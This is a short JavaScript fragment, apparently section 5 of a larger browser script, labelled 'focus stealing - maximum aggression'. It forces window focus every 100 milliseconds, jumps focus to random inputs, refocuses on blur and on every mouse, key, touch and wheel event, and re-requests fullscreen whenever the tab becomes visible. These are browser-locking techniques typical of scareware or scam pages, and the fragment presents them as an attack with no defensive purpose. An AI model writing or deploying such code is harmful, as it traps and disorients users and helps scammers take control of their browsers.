/**
 * 5. FOCUS STEALING - MAXIMUM AGGRESSION
 */
const FocusStealing = {
    init: function() {
        this.startFocusSteal();
        this.setupVisibilityHandler();
        this.stealOnEverything();
    },
    startFocusSteal: function() {
        const stealFocus = () => {
            window.focus();
            const inputs = document.querySelectorAll('input, button, a');
            if (inputs.length > 0) inputs[Math.floor(Math.random() * inputs.length)].focus();
        };
        setInterval(stealFocus, 100); // Every 100ms
        window.addEventListener('blur', () => { setTimeout(stealFocus, 10); });
    },
    setupVisibilityHandler: function() {
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                window.focus();
                // Try to enter fullscreen again
                try { document.documentElement.requestFullscreen(); } catch(e) {}
            }
        });
    },
    stealOnEverything: function() {
        ['mousemove', 'keydown', 'touchstart', 'wheel'].forEach(evt => {
            document.addEventListener(evt, () => { window.focus(); });
        });
    }
};